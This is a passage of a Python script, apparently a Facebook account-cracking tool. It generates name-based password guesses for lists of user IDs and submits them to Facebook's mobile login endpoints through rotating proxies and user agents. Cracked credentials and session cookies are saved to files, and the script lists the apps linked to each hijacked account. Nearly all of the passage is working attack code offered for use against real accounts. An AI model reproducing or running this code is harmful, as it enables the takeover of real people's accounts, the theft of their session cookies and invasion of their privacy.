	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>> Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	jalan(f'{M} Script ini Premium! {h} Aldytraa ')
	print('')
	jalan(f'Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	jalan(f'Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	jalan(f'CRAK SELESAI')
	print('MAU CRAK LAGI? (ya/no ) ? ')
	woi = input('Pilih : ')
	if woi in ['ya','Y']:
		back()
	else:
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{H}[IG:Aldytraa] {P}{b}{loop}{P}/{u}{len(id)}{P}/{P}{H}{ok}{P}/{P}{k}{cp}{x}/{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				statuscp = f'[•]ID:{idf}\[•]PASWORD:{pw}\n[•]UA:{ua}'
				statuscp1 = nel(statuscp,style='yellow')
				cetak(nel(statuscp1,title='🔒'))			#print(f'\r{k}[🔒]→{idf}|{pw}\n{u}{uak}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0;  en-us; I1927 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4562.135 Mobile Safari/537.36 Instagram 180.0.0.31.119 Android (30/11; 480dpi; 1080x2310; vivo/iQOO; I1927; I1928; qcom; e"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#print(f'\r{k}[🔒]→{idf}|{pw}\n{u}{uak}{N}')     					
					print(f'\r{U}{idf} • {pw}\n{B}{kuki}{N}')
					open('☬OK☬/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
# os.popen('play-audio data/ok.mp3')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
# os.popen('play-audio data/ok.mp3')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen('play-audio .cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; vivo 1915; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.7.0.1]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
				os.popen('play-audio .ok.mp3')
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1

#			if "checkpoint" in po.cookies.get_dict().keys():
#				print(f'\r{K}>> {idf}|{pw}{N}')     
#				os.popen('play-audio .cp.mp3')
#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
#				akun.append(idf+'|'+pw)
#				cp+=1
#				break
#			elif "c_user" in ses.cookies.get_dict().keys():
#				ok+=1
#				coki=po.cookies.get_dict()
#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
#				os.popen('play-audio .ok.mp3')
#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
#				cek_apk(session,coki)
#				break
#				
#			else:
#				continue
#		except requests.exceptions.ConnectionError:
#			time.sleep(31)
#	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='AOREC-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 12; RMX3081) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
			ses = requests.Session()
